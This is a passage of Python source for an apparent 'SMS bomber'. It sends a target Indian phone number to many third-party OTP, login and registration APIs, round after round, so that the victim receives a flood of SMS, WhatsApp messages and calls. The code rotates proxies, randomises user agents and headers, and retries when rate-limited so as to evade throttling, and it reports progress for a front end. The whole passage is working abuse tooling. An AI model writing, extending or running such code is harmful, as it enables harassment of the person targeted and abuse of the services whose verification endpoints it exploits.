                    _proxy_pool.mark_bad(proxy.replace("http://", ""))
                if _is_rate_limited(snippet, status):
                    _proxy_pool.mark_bad(proxy.replace("http://", ""))
                continue   # always continue for proxy attempts

            # Direct request returned non-ok
            return ok, status, snippet

        except asyncio.TimeoutError:
            if proxy:
                _proxy_pool.mark_bad(proxy.replace("http://", ""))
                continue
            return False, 0, "TIMEOUT"
        except Exception as exc:
            if proxy:
                _proxy_pool.mark_bad(proxy.replace("http://", ""))
                continue
            return False, -1, str(exc)[:120]

    return last


# ─── Fire one API ─────────────────────────────────────────────────────────────

MAX_RETRIES = 2


async def call_api(api: dict, phone: str):
    name         = api["name"]
    kind         = api.get("kind", "sms")
    icon         = {"sms": "📱", "whatsapp": "💬", "call": "📞"}.get(kind, "📡")
    phone_cc     = f"+91{phone}"
    ok_hint      = api.get("ok_hint", "")
    form_encoded = api.get("form_encoded", False)
    payload_key  = "data" if form_encoded else "json"

    if _is_cooled(name):
        logger.info(f"⏸ [{name}] Circuit cooling — skip")
        return (name, kind, False, -2, "CIRCUIT_COOLDOWN")

    url    = _substitute(api["url"], phone, phone_cc)
    method = api["method"].lower()

    login_payload    = _substitute(api[payload_key], phone, phone_cc)
    register_key     = f"register_{payload_key}"
    register_payload = _substitute(
        api.get(register_key, api[payload_key]), phone, phone_cc
    )

    def _make_headers() -> dict:
        h = dict(api.get("base_headers", {}))
        h.setdefault("User-Agent",      _rand_ua())
        h.setdefault("Accept",          "application/json, text/plain, */*")
        h.setdefault("Accept-Language", _rand_lang())
        h["Accept-Encoding"] = "gzip, deflate, br"
        h["Connection"]      = "keep-alive"
        h["sec-fetch-dest"]  = "empty"
        h["sec-fetch-mode"]  = "cors"
        h["sec-fetch-site"]  = "same-origin"
        return _substitute(h, phone, phone_cc)

    for attempt in range(1 + MAX_RETRIES):
        results = await asyncio.gather(
            _fire_single(url, method, _make_headers(), login_payload,
                         name, form_encoded, ok_hint),
            _fire_single(url, method, _make_headers(), register_payload,
                         name, form_encoded, ok_hint),
            return_exceptions=True,
        )

        best_ok = False
        best_status = 0
        best_snippet = ""
        for r in results:
            if isinstance(r, Exception):
                continue
            ok, status, snippet = r
            if ok:
                best_ok = True
                best_status = status
                best_snippet = snippet
                break
            if status > best_status:
                best_status = status
                best_snippet = snippet

        if best_ok:
            _record_ok(name)
            logger.info(f"✅ {icon}[{name}] HTTP {best_status} | {best_snippet[:160]}")
            return (name, kind, True, best_status, best_snippet[:160])

        if _is_rate_limited(best_snippet, best_status):
            _record_fail(name)
            if attempt < MAX_RETRIES:
                await asyncio.sleep(random.uniform(1.0, 2.5))
                continue

        if best_status in {500, 502, 503, 504} and attempt < MAX_RETRIES:
            await asyncio.sleep(random.uniform(0.3, 1.0))
            continue

        logger.info(f"❌ {icon}[{name}] HTTP {best_status} | {best_snippet[:160]}")
        _record_fail(name)
        return (name, kind, False, best_status, best_snippet[:160])

    return (name, kind, False, -1, "EXHAUSTED")


# ─── Group by kind ────────────────────────────────────────────────────────────

def _group_by_kind() -> dict:
    g: dict[str, list[dict]] = {"sms": [], "whatsapp": [], "call": []}
    for api in APIS:
        g.setdefault(api["kind"], []).append(api)
    return g


# ─── Guaranteed round ─────────────────────────────────────────────────────────

async def _fire_guaranteed(phone: str, kind_groups: dict) -> list:
    tasks   = [call_api(api, phone) for api in APIS]
    results = await asyncio.gather(*tasks, return_exceptions=True)

    kind_success = {k: False for k in kind_groups}
    for r in results:
        if isinstance(r, tuple) and r[2] is True:
            kind_success[r[1]] = True

    retry_tasks = []
    for kind, ok in kind_success.items():
        if not ok:
            for api in kind_groups.get(kind, []):
                if not _is_cooled(api["name"]):
                    retry_tasks.append(call_api(api, phone))
                    break

    extra = []
    if retry_tasks:
        extra = await asyncio.gather(*retry_tasks, return_exceptions=True)
    return list(results) + extra


# ─── Main bombing engine ──────────────────────────────────────────────────────

async def start_bombing(phone: str, rounds: int, progress_callback=None):
    success = failed = sms_ok = wa_ok = call_ok = 0
    total   = rounds * API_COUNT
    done    = 0

    await _proxy_pool.ensure_ready()
    pool_sz = _proxy_pool.size()
    logger.info(
        f"🚀 BOMB START | +91{phone} | rounds={rounds} "
        f"| APIs={API_COUNT} (📱{SMS_COUNT} 💬{WHATSAPP_COUNT} 📞{CALL_COUNT}) "
        f"| proxies={pool_sz}"
    )

    kind_groups = _group_by_kind()

    for round_num in range(1, rounds + 1):
        logger.info(f"── Round {round_num}/{rounds} (proxy pool: {_proxy_pool.size()}) ──")

        if _proxy_pool.size() < MIN_POOL_SIZE:
            asyncio.ensure_future(_proxy_pool.refresh())

        results    = await _fire_guaranteed(phone, kind_groups)
        round_ok   = 0
        round_fail = 0

        for r in results:
            if not isinstance(r, tuple):
                failed += 1; round_fail += 1; done += 1; continue
            _, kind, ok, _, _ = r
            if ok:
                success += 1; round_ok += 1
                if kind == "sms":         sms_ok  += 1
                elif kind == "whatsapp":  wa_ok   += 1
                elif kind == "call":      call_ok += 1
            else:
                failed += 1; round_fail += 1
            done += 1

        logger.info(
            f"── Round {round_num} done | ✅{round_ok} ❌{round_fail} "
            f"| Total ✅{success} (📱{sms_ok} 💬{wa_ok} 📞{call_ok}) ❌{failed}"
        )

        if progress_callback:
            pct   = int((done / max(total, 1)) * 100)
            rate  = success / max(done, 1)
            speed = ("🟢 𝗙𝗔𝗦𝗧" if rate > 0.50 else
                     "🟡 𝗠𝗘𝗗𝗜𝗨𝗠" if rate > 0.25 else "🔴 𝗦𝗟𝗢𝗪")
            bar_f = min(pct // 7, 14)
            bar   = "▰" * bar_f + "▱" * (14 - bar_f)
            await progress_callback(
                round_num, rounds, success, failed,
                done, total, pct, bar, speed,
                sms_ok, wa_ok, call_ok,
            )

    rate_pct = int(success / max(done, 1) * 100)
    logger.info(
        f"🏁 BOMB END | ✅{success} (📱{sms_ok} 💬{wa_ok} 📞{call_ok}) "
        f"❌{failed} | rate={rate_pct}%"
    )
    return success, failed, sms_ok, wa_ok, call_ok
